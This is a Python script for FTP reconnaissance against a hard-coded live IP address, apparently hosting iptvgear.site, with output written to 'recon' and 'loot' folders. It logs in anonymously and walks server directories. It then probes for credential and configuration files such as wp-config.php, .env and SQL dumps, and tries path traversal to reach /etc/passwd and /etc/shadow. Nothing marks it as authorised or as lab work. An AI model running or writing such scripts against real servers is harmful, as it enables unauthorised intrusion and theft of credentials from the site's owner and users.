#!/usr/bin/env python3
"""FTP enumeration - deep dive into discovered directories."""
import ftplib
import os
import time

HOST = "103.160.107.175"
PORT = 6969
OUTDIR = "/home/ubuntu/iptvgear.site"
MAP = f"{OUTDIR}/recon/active/ftp_filesystem.txt"
CREDS = f"{OUTDIR}/loot/ftp_creds.txt"
FILES_MD = f"{OUTDIR}/loot/ftp_files.md"

def log(msg=""):
    with open(MAP, "a") as f:
        f.write(msg + "\n")
    print(msg)

def explore():
    ftp = ftplib.FTP()
    ftp.connect(HOST, PORT, timeout=15)
    ftp.login("anonymous", "anonymous@test.com")
    
    log(f"\n{'='*70}")
    log("DEEP EXPLORATION OF DISCOVERED DIRECTORIES")
    log(f"{'='*70}")
    
    # Explore FTP-shared directory
    dirs_to_explore = ["FTP-shared", "root"]
    
    for d in dirs_to_explore:
        log(f"\n--- Exploring: {d} ---")
        try:
            resp = ftp.sendcmd(f"CWD {d}")
            log(f"CWD {d}: {resp}")
            pwd = ftp.pwd()
            log(f"PWD: {pwd}")
            stat = ftp.sendcmd("STAT")
            log(f"STAT {d}:\n{stat}")
        except Exception as e:
            log(f"ERROR accessing {d}: {e}")
            continue
        
        # Try to list contents and explore deeper
        # If we can access deeper, walk it
        try:
            # Try NLIST
            names = ftp.nlst()
            log(f"NLIST {d}: {names}")
            for name in names:
                if name in ('.', '..'):
                    continue
                try:
                    s = ftp.sendcmd(f"STAT {name}")
                    log(f"STAT {d}/{name}:\n{s}")
                except Exception as e:
                    log(f"STAT {d}/{name} error: {e}")
        except Exception as e:
            log(f"NLIST error: {e}")
            # Try MLSD
            try:
                mlsd = ftp.mlsd()
                log(f"MLSD results:")
                for item in mlsd:
                    log(f"  {item}")
            except:
                log("MLSD not supported")
    
    # Return to root
    ftp.sendcmd("CWD /")
    
    # MDTM checks on files we know about
    log(f"\n{'='*70}")
    log("MDTM/SIZE ON KEY FILES")
    log(f"{'='*70}")
    
    paths_to_check = [
        "wp-config.php", "/wp-config.php",
        ".env",
        ".htaccess",
        "index.php", "index.html", "index.htm",
        "config.php",
        "configuration.php",
        "db.php",
        "database.php",
        "backup.sql",
        "dump.sql",
        "composer.json",
        ".gitignore",
        "robots.txt",
        "admin.php",
        "login.php",
        "wp-login.php",
        "xmlrpc.php",
    ]
    
    for p in paths_to_check:
        for cmd_prefix in ["MDTM", "SIZE"]:
            try:
                resp = ftp.sendcmd(f"{cmd_prefix} {p}")
                log(f"{cmd_prefix} {p}: {resp}")
            except:
                pass
    
    # Try to get /etc/passwd via various paths
    etc_files = [
        "/etc/passwd", "/etc/shadow", "/etc/group",
        "/etc/hosts", "/etc/hostname", "/etc/resolv.conf",
        "/etc/proftpd.conf", "/etc/proftpd/proftpd.conf",
        "/etc/apache2/apache2.conf", "/etc/httpd/conf/httpd.conf",
        "../etc/passwd", "../../etc/passwd",
        "passwd", "../passwd",
    ]
    
    for p in etc_files:
        for cmd_prefix in ["MDTM", "SIZE"]:
            try:
                resp = ftp.sendcmd(f"{cmd_prefix} {p}")
                log(f"{cmd_prefix} {p}: {resp}")
            except:
                pass
    
    ftp.quit()

explore()